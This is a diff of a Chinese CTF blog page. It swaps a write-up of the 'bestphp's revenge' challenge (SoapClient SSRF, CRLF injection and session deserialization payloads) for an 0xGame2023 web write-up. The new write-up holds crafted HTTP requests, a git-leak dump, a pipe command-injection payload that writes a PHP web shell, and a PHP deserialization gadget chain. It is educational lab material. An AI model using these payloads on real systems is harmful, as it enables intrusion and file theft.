@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bestphp&#39;s revenge | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 , session反序列化 , CRLF Injection ">
-  <meta name="description" content="bestphp&#39;s revenge | 甜筒园">
+  <title>0xGame2023 wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="0xGame2023 wp | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[TOC] WEB[Week 1] signin页面审查元素发现有个js文件，末尾有一行注释： &#x2F;&#x2F;# sourceMappingURL&#x3D;index-33309f51.js.map  访问后下载打开，Ctrl+F查找字符串0xGame匹配到flag 0xGame&amp;#123;c788fa80-2184-429f-b410-48cb8e2de0ff&amp;#125;   [Week 1] hello_htt">
 <meta property="og:type" content="article">
@@ -588,9 +588,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bestphps-revenge" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-0xGame2023-wp" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bestphp&#39;s revenge</h1>
+        <h1 class="article-title">0xGame2023 wp</h1>
     
     <div class="article-meta">
         
@@ -605,26 +605,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-            <a class="color2">session反序列化</a>
-            
-            <a class="color5">CRLF Injection</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-10-08 11:25:00'>2023-10-01 14:16</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-21 16:10:19'>2023-03-14 19:17</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:1.5k</span>
+        <span>Count:978</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -654,7 +643,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%86%85%E7%BD%AE%E7%B1%BBSoapClient"><span class="toc-text">1.php内置类SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CRLF-Injection%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. CRLF Injection漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call-user-func"><span class="toc-text">3.call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHPsession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">4.PHPsession 反序列化</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-signin"><span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-ping"><span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-text">[Week 2] ez_unserialize</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -670,133 +659,202 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>题目源码:</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$b = &#39;implode&#39;;
-call_user_func($_GET[&#39;f&#39;], $_POST);
-session_start();
-if (isset($_GET[&#39;name&#39;])) &#123;
-  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
-&#125;
-var_dump($_SESSION);
-$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
-call_user_func($b, $a);
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-signin"><span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-ping"><span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-text">[Week 2] ez_unserialize</span></a></li></ol></li></ol></div></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>页面审查元素发现有个<code>js</code>文件，末尾有一行注释：</p>
+<pre><code class="./assets/index-33309f51.js">//# sourceMappingURL=index-33309f51.js.map
+</code></pre>
+<p>访问后下载打开，<code>Ctrl+F</code>查找字符串<code>0xGame</code>匹配到flag</p>
+<pre><code>0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231001142350507.png" alt="image-20231001142350507"></p>
+<h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>典之又典</p>
+<pre><code>POST /?query=ctf HTTP/1.1
+Referer: ys.mihoyo.com
+User-Agent: HarmonyOS Browser
+X-Forwarded-For: 127.0.0.1
+Origin: http://120.27.148.152:50012
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://120.27.148.152:50012/?query=ctf
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: role=admin
 
-//flag.php(扫目录扫的)
-only localhost can get flag!session_start();
-echo &#39;only localhost can get flag!&#39;;
-$flag = &#39;LCTF&#123;*************************&#125;&#39;;
-if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;
-       $_SESSION[&#39;flag&#39;] = $flag;
-   &#125;
-only localhost can get flag!
+action=getflag
 </code></pre>
-<p>先来学习一些知识点：</p>
-<hr>
-<h3 id="1-php内置类SoapClient"><a href="#1-php内置类SoapClient" class="headerlink" title="1.php内置类SoapClient"></a>1.php内置类SoapClient</h3><p>​         SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1999159-20210127114912726-2133757689.jpg"></p>
-<p>​         第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
-<p><strong>简单的用法</strong></p>
-<pre><code class="php">&lt;?php
-$a = new SoapClient(null,array(location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;uri&#39;=&#39;http://127.0.0.1/&#39;));
-$b = serialize($a);
-echo $b;
-$c = unserialize($b);
-$c-&gt;a();
+<p>发包后拿到flag</p>
+<pre><code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;
 </code></pre>
-<p>​        可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
-<h3 id="2-CRLF-Injection漏洞"><a href="#2-CRLF-Injection漏洞" class="headerlink" title="2. CRLF Injection漏洞"></a>2. CRLF Injection漏洞</h3><p>​        <strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
+<h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><p>理解就能秒</p>
+<pre><code>POST /?a[]=1&amp;b[]=2 HTTP/1.1
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: name=php://filter/convert.base64-encode/resource=flag
+
+c=1024.1ff
+</code></pre>
+<p>拿到字符串去base64解码</p>
+<pre><code>0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;
+</code></pre>
+<h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>考点写的非常明确是git泄露，但对工具的需求有点坑人，我拿平常用的<code>GitHack-master</code>跑不出来，换了个<code>GitHacker</code>才成功跑出来。下面是完整命令：</p>
+<pre><code>#安装
+python3 -m pip install -i https://pypi.org/simple/ GitHacker
+#运行
+githacker --url http://120.27.148.152:50013/.git/ --output-folder result
+#进入目录后查看历史版本
+git log --reflog
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231005170050253.png" alt="image-20231005170050253"></p>
+<pre><code>#切换版本为flag那个
+git reset --hard 8a5b670558921bd232d75b29542492f00698298b
+#在当前目录匹配包含flag的文件
+grep -r  &quot;flag&quot; ./
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231005170247956.png" alt="image-20231005170247956"></p>
+<p>拿出来url解码一下拿到flag</p>
+<pre><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;
+</code></pre>
+<h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>ctrl+u拿到提示查看api.php源码</p>
 <pre><code class="php">&lt;?php
-$target = &quot;http://127.0.0.1/flag.php&quot;;
-$options = array(
-    &quot;location&quot; =&gt; $target,
-    &quot;user_agent&quot; =&gt; &quot;ttycp3\r\nCookie: PHPSESSID=114514\r\n&quot;,
-    &quot;uri&quot; =&gt; &quot;demo&quot;
-);
-$attack = new SoapClient(null,$options);
-$payload = serialize($attack);
-unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求
+
+function sanitize($s) &#123;
+    $s = str_replace(&#39;;&#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39; &#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39;/&#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39;flag&#39;, &#39;&#39;, $s);
+    return $s;
+&#125;
+
+if (isset($_GET[&#39;source&#39;])) &#123;
+    highlight_file(__FILE__);
+    die();
+&#125;
+
+if (!isset($_POST[&#39;ip&#39;])) &#123;
+    die(&#39;No IP Address&#39;);
+&#125;
+
+$ip = $_POST[&#39;ip&#39;];
+
+$ip = sanitize($ip);
+
+if (!preg_match(&#39;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#39;, $ip)) &#123;
+    die(&#39;Invalid IP Address&#39;);
+&#125;
+
+system(&#39;ping -c 4 &#39;.$ip. &#39; 2&gt;&amp;1&#39;);
+
 ?&gt;
 </code></pre>
-<h3 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3.call_user_func"></a>3.call_user_func</h3><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
-<p>先传入<code>extract()</code>，将<code>$b</code>覆盖成回调函数，这样题目中的 <code>call_user_func($b,$a)</code> 就可以变成 <code>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</code> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
-<h3 id="4-PHPsession-反序列化"><a href="#4-PHPsession-反序列化" class="headerlink" title="4.PHPsession 反序列化"></a>4.PHPsession 反序列化</h3><pre><code>session.save_handler  session保存形式。默认为files
+<p>利用管道符进行多命令执行，写文件到当前目录：</p>
+<pre><code>POST /api.php
 
-session.save_path    session保存路径
-
-session.serialize_handler  session序列化存储所用处理器。默认为php
+ip=127.0.0.1|echo$&#123;IFS&#125;&quot;PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7&quot;|base64$&#123;IFS&#125;-d$&#123;IFS&#125;&gt;1.php
 </code></pre>
-<p>session中有三种序列化处理器处理session的情况</p>
-<pre><code class="php">&lt;?php 
-
-session_start();
-
-$_SESSION[&#39;name&#39;]=&#39;ttycp3&#39;;
+<p>访问1.php拿到flag</p>
+<pre><code>0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125;
 </code></pre>
-<pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
-    
-php 键名+竖线（|）+经过serialize()函数处理过的值
-    
-php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
-    
-    
-例如：    
-当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;ttycp3&quot;;  
+<h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><pre><code>&lt;?php
 
-当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;ttycp3&quot;;&#125;
+show_source(__FILE__);
 
-当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;ttycp3&quot;;
-</code></pre>
-<p>使用不同引擎就会发生漏洞，通常是先使用php_serialize进行序列化，然后php默认引擎进行反序列化，这是因为<strong>php引擎反序列化时，|被当做分隔符</strong></p>
-<p>例如</p>
-<p>php_serialize引擎  a:1:{s:4:”name”;s:9:”|username”;}</p>
-<p>php  就会反序列化username ，前面是键名，后面是键值</p>
-<p>所以我们只需要传入$_SESSION[‘name’] &#x3D; |序列化内容</p>
-<hr>
-<p>接下来分析题目:</p>
-<p>​          flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF</p>
-<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
-<p>​        这里还用到一个知识点：<strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。</strong></p>
-<p> 脚本构造：</p>
-<pre><code class="php">&lt;?php
-$target=&#39;http://127.0.0.1/flag.php&#39;;
-$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
-    &#39;user_agent&#39; =&gt; &quot;ttycp3\r\nCookie:PHPSESSID=123456\r\n&quot;,
-    &#39;uri&#39; =&gt; &quot;http://127.0.0.1/&quot;));
+class Cache &#123;
+    public $key;
+    public $value;
+    public $expired;
+    public $helper;
 
-$se = serialize($b);
-echo &quot;|&quot;.urlencode($se);
+    public function __construct($key, $value, $helper) &#123;
+        $this-&gt;key = $key;
+        $this-&gt;value = $value;
+        $this-&gt;helper = $helper;
 
-//注意下，这个脚本想要执行，需要将php.ini里的extension=soap前面的分号去掉
-</code></pre>
-<p> 执行后得到</p>
-<pre><code>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
-</code></pre>
-<p>传参：</p>
-<pre><code class="html">GET:
-f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+        $this-&gt;expired = False;
+    &#125;
 
-POST:
-serialize_handler=php_serialize
+    public function __wakeup() &#123;
+        $this-&gt;expired = False;
+    &#125;
+
+    public function expired() &#123;
+        if ($this-&gt;expired) &#123;
+            $this-&gt;helper-&gt;clean($this-&gt;key);
+            return True;
+        &#125; else &#123;
+            return False;
+        &#125;
+    &#125;
+&#125;
+
+class Storage &#123;
+    public $store;
+
+    public function __construct() &#123;
+        $this-&gt;store = array();
+    &#125;
+
+    public function __set($name, $value) &#123;//2
+        if (!$this-&gt;store) &#123;
+            $this-&gt;store = array();
+        &#125;
+
+        if (!$value-&gt;expired()) &#123;//3
+            $this-&gt;store[$name] = $value;
+        &#125;
+    &#125;
+
+    public function __get($name) &#123;
+        return $this-&gt;data[$name];
+    &#125;
+&#125;
+
+class Helper &#123;
+    public $funcs;
+
+    public function __construct($funcs) &#123;
+        $this-&gt;funcs = $funcs;
+    &#125;
+
+    public function __call($name, $args) &#123;
+        $this-&gt;funcs[$name](...$args);
+    &#125;
+&#125;
+
+class DataObject &#123;
+    public $storage;
+    public $data;
+
+    public function __destruct() &#123;//1
+        foreach ($this-&gt;data as $key =&gt; $value) &#123;
+            $this-&gt;storage-&gt;$key = $value;
+        &#125;
+    &#125;
+&#125;
+
+//if (isset($_GET[&#39;u&#39;])) &#123;
+//    unserialize($_GET[&#39;u&#39;]);
+//&#125;
+$a=new DataObject();
+$b=new Storage();
+$c=new Helper();
+$c-&gt;funcs[&#39;expired&#39;]=&quot;phpinfo&quot;;
+$d=new Cache();
+$a-&gt;storage=$b;
+$a-&gt;data[&quot;sss&quot;]=$c;
+echo serialize($a);
+?&gt;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314193907764.png" alt="image-20230314193907764"></p>
-<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
-<p>传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
-<p>传参：</p>
-<pre><code>GET:
-f=extract&amp;name=SoapClient
-POST:
-b=call_user_func
+<p>有点非预期，少用了一个类，不用绕过wakeup了</p>
+<pre><code>O:10:&quot;DataObject&quot;:2:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;a:0:&#123;&#125;&#125;s:4:&quot;data&quot;;a:1:&#123;s:3:&quot;sss&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:7:&quot;expired&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#125;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194523209.png" alt="image-20230314194523209"></p>
-<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
-<p>传参：</p>
-<pre><code>Cookie:PHPSESSID=123456
+<pre><code>0xGame&#123;4d961b66-fdbb-410f-9955-558d14f1e308&#125;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194729913.png" alt="image-20230314194729913"></p>
-<p><strong>参考</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">bestphp’s revenge[详解]</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
